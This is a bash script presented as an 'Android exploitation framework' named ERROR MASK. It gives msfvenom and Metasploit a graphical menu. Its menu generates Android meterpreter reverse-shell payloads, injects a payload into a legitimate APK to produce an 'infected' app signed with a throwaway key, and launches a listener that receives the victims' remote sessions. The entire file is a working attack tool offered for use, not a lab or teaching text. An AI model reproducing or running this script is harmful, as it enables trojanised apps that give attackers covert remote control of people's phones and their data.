#!/bin/bash

###===============================================
###==        ERROR MASK - HACKING TOOL         ==
###==        Coded by BlackHAT (Optimized)     ==
###==             Enhanced Version             ==
###===============================================

#== Configuration
TMP_DIR="/tmp/errormask"
LOG_FILE="$TMP_DIR/activity.log"
MATRIX_PID=""

#== Cleanup Function
cleanup() {
    kill -9 $MATRIX_PID 2>/dev/null
    rm -rf "$TMP_DIR"
    exit
}

#== Dependencies Check
check_deps() {
    declare -A deps=(
        ["msfvenom"]="metasploit-framework"
        ["zenity"]="zenity"
        ["figlet"]="figlet"
        ["lolcat"]="lolcat"
        ["apktool"]="apktool"
        ["jarsigner"]="openjdk-11-jdk"
        ["zipalign"]="zipalign"
    )

    for cmd in "${!deps[@]}"; do
        if ! command -v $cmd >/dev/null 2>&1; then
            zenity --error --text="Missing $cmd! Install with:\nsudo apt install ${deps[$cmd]}"
            cleanup
        fi
    done
}

#== Initialize Environment
init() {
    mkdir -p "$TMP_DIR"
    touch "$LOG_FILE"
    trap cleanup EXIT TERM INT
}

#== Show Banner
show_banner() {
    clear
    figlet -f slant "ERROR MASK" | lolcat
    echo -e "\e[32m[+] Advanced Android Exploitation Framework\n[+] Version 2.1 | Secure Mode Enabled\e[0m\n"
}

#== Matrix Effect
matrix_effect() {
    while :; do
        echo -ne "\e[32m"$(LC_ALL=C tr -dc '01' < /dev/urandom | head -c 100)"\e[0m\r"
        sleep 0.1
    done
}

#== Get Inputs
get_inputs() {
    LHOST=$(ip route get 1 | awk '{print $7}' | head -1)
    inputs=$(zenity --forms --title "Payload Configuration" \
        --text "Enter Connection Details" \
        --add-entry "LHOST" "$LHOST" \
        --add-entry "LPORT" "4444" \
        --add-list "Payload Type" --list-values "android/meterpreter/reverse_tcp|android/meterpreter/reverse_http|android/meterpreter/reverse_https")

    [ -z "$inputs" ] && cleanup
    LHOST=$(echo "$inputs" | cut -d'|' -f1)
    LPORT=$(echo "$inputs" | cut -d'|' -f2)
    PAYLOAD_TYPE=$(echo "$inputs" | cut -d'|' -f3)

    if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || [ "$LPORT" -lt 1 ] || [ "$LPORT" -gt 65535 ]; then
        zenity --error --text="Invalid LPORT! Must be 1-65535"
        cleanup
    fi
}

#== Generate Payload
generate_payload() {
    output=$(zenity --file-selection --save --title "Save Payload As" --filename="payload.apk")
    [ -z "$output" ] && return

    zenity --info --text="Generating payload... This may take 1-2 minutes."
    if msfvenom -p "$PAYLOAD_TYPE" LHOST="$LHOST" LPORT="$LPORT" -o "$output" >> "$LOG_FILE" 2>&1; then
        zenity --info --text="Payload generated:\n$output"
    else
        zenity --error --text="Payload generation failed!\nCheck $LOG_FILE"
    fi
}

#== Bind Payload
bind_payload() {
    original_apk=$(zenity --file-selection --title "Select Original APK" --file-filter="*.apk")
    [ -z "$original_apk" ] && return

    output=$(zenity --file-selection --save --title "Save Infected APK As" --filename="infected.apk")
    [ -z "$output" ] && return

    (
        echo "# Decompiling APK..."
        apktool d -f -o "$TMP_DIR/decompiled" "$original_apk" >> "$LOG_FILE" 2>&1

        echo "# Injecting Payload..."
        msfvenom -p "$PAYLOAD_TYPE" LHOST="$LHOST" LPORT="$LPORT" -x "$original_apk" -o "$TMP_DIR/temp.apk" >> "$LOG_FILE" 2>&1

        echo "# Rebuilding APK..."
        apktool b "$TMP_DIR/decompiled" -o "$TMP_DIR/unsigned.apk" >> "$LOG_FILE" 2>&1

        echo "# Signing APK..."
        keytool -genkey -v -keystore "$TMP_DIR/key.keystore" -alias android -keyalg RSA -keysize 2048 -validity 10000 -storepass password -keypass password -noprompt >> "$LOG_FILE" 2>&1
        jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore "$TMP_DIR/key.keystore" -storepass password "$TMP_DIR/unsigned.apk" android >> "$LOG_FILE" 2>&1
        zipalign -v 4 "$TMP_DIR/unsigned.apk" "$output" >> "$LOG_FILE" 2>&1

        echo "# Cleaning up..."
        rm -rf "$TMP_DIR/decompiled" "$TMP_DIR/unsigned.apk"

    ) | zenity --progress --title="Processing APK" --text="Binding payload..." --pulsate --auto-close

    if [ -f "$output" ]; then
        zenity --info --text="Infected APK created:\n$output"
    else
        zenity --error --text="APK binding failed!\nCheck $LOG_FILE"
    fi
}

#== Start Listener
start_listener() {
    rc_file="$TMP_DIR/listener.rc"
    echo "use exploit/multi/handler" > "$rc_file"
    echo "set payload $PAYLOAD_TYPE" >> "$rc_file"
    echo "set LHOST $LHOST" >> "$rc_file"
    echo "set LPORT $LPORT" >> "$rc_file"
    echo "exploit -j -z" >> "$rc_file"

    xterm -T "Metasploit Listener" -e "msfconsole -q -r $rc_file" &
}

#== Main Menu
main_menu() {
    while true; do
        choice=$(zenity --list --title="ERROR MASK v2.1" --text="Select Operation:" \
            --column="ID" --column="Operation" \
            1 "Generate Standard Payload" \
            2 "Bind Payload to APK" \
            3 "Start Listener" \
            4 "Show Logs" \
            5 "Exit")

        case $choice in
            1) generate_payload ;;
            2) bind_payload ;;
            3) start_listener ;;
            4) zenity --text-info --filename="$LOG_FILE" --width=800 --height=600 ;;
            5|*) cleanup ;;
        esac
    done
}

#== Execution Flow
check_deps
init
show_banner
matrix_effect & MATRIX_PID=$!
get_inputs
main_menu
